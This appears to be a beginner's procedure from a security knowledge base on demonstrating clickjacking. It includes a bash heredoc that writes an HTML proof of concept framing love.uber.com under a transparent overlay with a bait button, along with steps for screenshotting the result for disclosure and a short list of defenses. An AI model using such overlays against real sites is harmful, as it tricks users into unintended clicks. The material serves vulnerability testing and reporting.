---
tags:
  - clickjacking
  - poc
  - screenshot
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/create-iframe-test-html]]'
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
id: 3c31f789-1a0b-40fb-aea4-2866875cfbe3
created_at: '2025-12-14T17:28:04.685Z'
updated_at: '2025-12-14T17:28:04.685Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate-Clickjacking-with-Screenshot-POC

## Summary

This procedure demonstrates a clickjacking vulnerability by enhancing an iframe test with an overlay and capturing a screenshot as proof-of-concept, showing how an attacker could trick users into clicking malicious elements over the embedded site.

## Description

Building on iframe embedding, this adds a transparent overlay with bait elements (e.g., buttons) to simulate click theft. It targets sites like love.uber.com without frame protections. The scenario involves local HTML testing; outcomes include visual evidence of the exploit. No server-side access is required, but ethical disclosure is essential.

## Requirements

1. Successful iframe embedding from prior test
2. Screenshot tool (built-in OS tools or browser extensions)
3. Basic HTML editing knowledge

## Defense

Defensive measures and detection strategies:

- Enforce strict X-Frame-Options headers
- Audit CSP policies for frame-ancestors
- Log and alert on unusual embedding attempts in server access logs

## Objectives

1. Visualize the clickjacking setup
2. Provide evidence for vulnerability reporting
3. Illustrate potential user deception

## Instructions

### Step 1: Enhance HTML with Overlay

**Context**: Modify the test HTML to include a transparent overlay simulating the attack surface.

**Command** ([[commands/create-iframe-test-html]] with enhancements):
```bash
cat > enhanced-iframe.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        .overlay { position: absolute; top: 0; left: 0; width: 800px; height: 100px; background: transparent; z-index: 10; }
        .bait { position: absolute; top: 50px; left: 50px; }
    </style>
</head>
<body>
    <h1>Clickjacking POC</h1>
    <iframe src="https://love.uber.com" width="800" height="600"></iframe>
    <div class="overlay">
        <button class="bait" onclick="alert('Click intercepted!')">Click Me (Fake Button)</button>
    </div>
</body>
</html>
EOF
```

> Creates enhanced-iframe.html with overlay. Expected output: File generated; open in browser to see iframe with invisible bait.

### Step 2: Capture and Document POC

**Context**: Load the enhanced page and take a screenshot to record the embedding.

**Instructions**: Open enhanced-iframe.html in a browser, interact to show overlay effect (e.g., trigger alert), and use screenshot tool to capture (save as uber.png).

> Screenshot should show the full iframe load and any overlaid elements, proving the site's frammability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/create-iframe-test-html]]

## Tools Used


## Tags

- [[clickjacking]]
- [[proof-of-concept]]
- [[web]]
